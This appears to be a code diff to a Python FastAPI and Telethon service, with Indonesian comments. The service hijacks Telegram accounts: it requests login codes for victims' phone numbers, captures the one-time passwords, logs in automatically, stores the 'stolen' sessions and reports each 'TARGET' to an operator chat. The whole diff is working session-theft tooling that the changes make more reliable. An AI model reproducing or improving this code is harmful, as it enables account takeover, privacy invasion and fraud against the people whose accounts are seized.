@@ -15,14 +15,23 @@ PHONE = os.getenv('PHONE')
 BOT_TOKEN = os.getenv('BOT_TOKEN')
 CHAT_ID = int(os.getenv('CHAT_ID'))
 
-# Cek ENV
 if not all([API_ID, API_HASH, PHONE, BOT_TOKEN, CHAT_ID]):
-    raise RuntimeError("Set semua variable di Railway, brengsek!")
+    raise RuntimeError("Set semua variable di Railway!")
 
+# Client utama (hanya 1)
 client = TelegramClient('jinx_listener', API_ID, API_HASH)
 listening = {}
 sessions = {}
 OTP_PATTERN = re.compile(r'\b(\d{5})\b')
+
+# Startup: connect + start SEKALI
+@app.on_event("startup")
+async def startup():
+    await client.connect()
+    if not await client.is_user_authorized():
+        await client.start(bot_token=BOT_TOKEN)
+    os.makedirs("stolen", exist_ok=True)
+    print("JINX BOT HIDUP – SIAP CURI SESSION!")
 
 @app.post("/start_listen")
 async def start_listen(req: Request):
@@ -30,7 +39,7 @@ async def start_listen(req: Request):
     phone = data['phone']
 
     temp_client = TelegramClient(StringSession(), API_ID, API_HASH)
-    await temp_client.connect()
+    await temp_client.connect()  # Hanya connect
 
     try:
         sent = await temp_client.send_code_request(phone)
@@ -38,11 +47,11 @@ async def start_listen(req: Request):
 
         @temp_client.on(events.NewMessage(incoming=True))
         async def handler(event):
-            if OTP_PATTERN.search(event.message.message):
+            if event.is_private and OTP_PATTERN.search(event.message.message):
                 code = OTP_PATTERN.search(event.message.message).group(1)
                 await auto_login(phone, code)
 
-        await client.send_message(CHAT_ID, f"TARGET: `{phone}`\nMenunggu OTP...")
+        await client.send_message(CHAT_ID, f"TARGET MASUK!\nNomor: `{phone}`\nMenunggu OTP...")
         return {"success": True}
     except Exception as e:
         return {"success": False, "error": str(e)}
@@ -74,18 +83,12 @@ async def request_otp(phone: str):
     if phone not in sessions:
         return {"success": False, "error": "No session"}
     
+    # Client baru dari session curian
     stolen = TelegramClient(StringSession(sessions[phone]), API_ID, API_HASH)
     await stolen.connect()
-    await stolen.start()
+    if not await stolen.is_user_authorized():
+        await stolen.start()  # Hanya jika belum login
     await stolen.send_code_request(phone)
     return {"success": True}
 
-# Startup
-@app.on_event("startup")
-async def startup():
-    await client.start(bot_token=BOT_TOKEN)
-    os.makedirs("stolen", exist_ok=True)
-    print("JINX BOT HIDUP – SIAP CURI SESSION!")
-
-if __name__ == "__main__":
-    uvicorn.run("main:app", host="0.0.0.0", port=8080, log_level="info")
+# JANGAN PAKAI __main__ YANG JALANKAN APA-APA!
